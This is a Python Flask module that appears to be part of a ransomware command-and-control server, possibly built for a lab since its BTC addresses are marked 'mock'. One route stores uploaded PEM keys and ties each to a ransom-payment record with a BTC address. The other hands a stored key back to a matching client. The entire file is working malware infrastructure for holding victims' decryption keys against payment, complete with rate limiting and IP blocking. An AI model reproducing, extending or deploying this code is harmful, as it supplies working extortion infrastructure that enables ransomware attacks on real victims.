from flask import Blueprint, request, jsonify, send_file
from werkzeug.utils import secure_filename
import os
import random
import sqlite3
from C2_Variables import KEY_STORAGE_DIR, DB_PATH
from Validation import check_keys
from Extensions import limiter, update_block_ip_list, check_pem_file

key_bp = Blueprint('key', __name__)

####################################################################################################################

@key_bp.route('/upload_key', methods=['POST']) 
@limiter.limit("3 per minute")
def upload_key():
    received_api_key = request.headers.get('API-KEY')
    session_token = request.headers.get('Session-Token')
    unique_uuid = request.headers.get('uuid')
    received_ip = request.remote_addr
    validation_failed = check_keys(received_api_key, session_token, received_ip, unique_uuid)
    if validation_failed:
        return validation_failed

    key_file = request.files.get('key')
    if not key_file:
        return jsonify({"error": "No key provided"}), 400

    key_filename = secure_filename(key_file.filename)
    if not key_filename.endswith(".pem"):
        ip = request.remote_addr
        update_block_ip_list(ip)
        return jsonify({"error": "File type"}), 400
    
    valid_file, file_error = check_pem_file(key_file)
    if not valid_file:
        ip = request.remote_addr
        update_block_ip_list(ip)
        return jsonify({"error": file_error}), 400
    
    key_path = os.path.join(KEY_STORAGE_DIR, key_filename)
    correct_key_path = os.path.realpath(key_path)
    if not correct_key_path.startswith(os.path.realpath(KEY_STORAGE_DIR)):
        return jsonify({"error": "Filename"}), 400

    btc_address = f"mock_btc_{random.randint(1000,9999)}"

    try:
        key_file.save(correct_key_path)
        os.chmod(correct_key_path, 0o600) # Changes file to read and write for only owner
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO payments (unique_id, btc_address, paid, uuid) VALUES (?, ?, ?, ?)',
                    (key_filename, btc_address, False, unique_uuid))
        conn.commit()
        conn.close()
        return jsonify({"file": key_filename, "btc_address": btc_address}), 200
    except Exception as e:
        print(f"Error: {e}") # Debug Message
        return jsonify({"Error": "Error Happen"}), 500

####################################################################################################################

@key_bp.route('/get_key/<unique_id>', methods=['GET'])
@limiter.limit("3 per minute")
def get_key(unique_id):
    received_api_key = request.headers.get('API-KEY')
    session_token = request.headers.get('Session-Token')
    unique_uuid = request.headers.get('uuid')
    received_ip = request.remote_addr
    validation_failed = check_keys(received_api_key, session_token, received_ip, unique_uuid)
    if validation_failed:
        return validation_failed
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT uuid FROM payments WHERE unique_id = ?', (unique_id,))
    result = c.fetchone()
    conn.close()

    if result is None or result[0] != unique_uuid:
        return jsonify({"error": "Unauthorized"}), 403

    unique_id_safe = secure_filename(unique_id)
    key_path = os.path.join(KEY_STORAGE_DIR, unique_id_safe)
    correct_key_path = os.path.realpath(key_path)
    if not correct_key_path.startswith(os.path.realpath(KEY_STORAGE_DIR)):
        return jsonify({"error": "File path"}), 400
    if not os.path.exists(correct_key_path):
        return jsonify({"error": "Filename not found"}), 404

    try:
        return send_file(
            key_path,
            mimetype='application/x-pem-file',
            as_attachment=True,
            download_name=unique_id
        )
    except Exception as e:
        print(f"Error: {e}") # Debug Message
        return jsonify({"Error": "Error Happen"}), 500

####################################################################################################################
